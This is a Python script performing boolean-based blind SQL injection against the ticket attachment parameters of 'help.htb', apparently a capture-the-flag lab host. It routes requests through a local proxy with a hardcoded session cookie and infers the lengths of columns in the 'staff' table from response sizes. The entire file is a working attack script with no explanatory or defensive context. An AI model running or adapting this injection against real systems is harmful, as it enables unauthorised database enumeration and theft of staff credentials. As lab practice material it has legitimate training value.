import requests
import string
import warnings
#warnings.filterwarnings("ignore")


proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}

headers = {'Cookie': 'lang=english; PHPSESSID=20q6sd4sfdodqrkk71u2cu7701; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BEvwgMfmNMCNC%2FrrvtMz5waMHeN%2BAVjpAQJY4xaIMzEsQ%3D%3D'}




def lenColumn():


   for n in string.digits[0:20]:





      url = "http://help.htb/support/?v=view_tickets&action=ticket&param%5B%5D=4&param%5B%5D=attachment&param%5B%5D=1&param%5B%5D=6+AND+(SELECT+LENGTH(column_name)+FROM+information_schema.columns+WHERE+table_schema%3ddatabase()+AND+table_name%3d'staff'+LIMIT+"+ n +",1)%3d" 

      for i in string.digits[1:25]:

         

         part1 = url + i + "+--+-"

         r = requests.get(part1, headers=headers, proxies=proxies, verify=False)

         t = r.content

         if len(t) == 78881:
            print("length of ", n, "th column is : ", i)
            break

lenColumn()
